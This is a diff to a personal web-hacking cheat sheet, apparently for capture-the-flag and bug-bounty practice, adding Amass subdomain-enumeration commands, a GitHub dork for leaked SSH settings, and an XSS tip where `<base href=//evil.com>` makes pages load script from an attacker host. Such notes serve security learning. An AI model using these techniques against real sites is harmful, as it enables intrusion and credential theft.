@@ -16,6 +16,36 @@
 - For a newline, somtimes you need CRLF, individual CR or LF might not work, therefore use: `%0d%0a` (webhacking.kr - 38).
 - Don't forget to look into the sources, interesting things might not always be inline.
 
+### Recon
+- Before running any tools, just roam around the website manually.
+- Look into SecLists / PayloadAllTheThings / FuzzDB.
+
+#### Tools
+##### Amass
+```
+$ amass intel -whois -d DOMAIN
+$ amass enum -dir OUTPUT -passive -src -d DOMAIN
+$ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
+
+
+# Track differences between enumerations
+amass track
+
+# Manipulate the Amass graph database
+amass db
+
+# To see sources used
+amass enum -list
+```
+
+##### Param [Miner / Spider / Arjun / Wayback]
+##### FFUF
+##### Nuclei
+##### gowitness
+
+#### GitHub dorks
+- `"example.com" ssh language:yaml`
+
 ### Tools
 #### Burp Suite
 - Learn Burp hotkeys.
@@ -111,6 +141,7 @@ var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
 - Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
 - To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
 - If there is any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
+- `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
 - Blind XSS:
     - Read `https://brutelogic.com.br/blog/blind-xss-code/` get the code here `http://brutelogic.com.br/brutal/blind/index.txt`.
     - Use `http://xss.rocks/xss.js` for including an `alert()` js file.
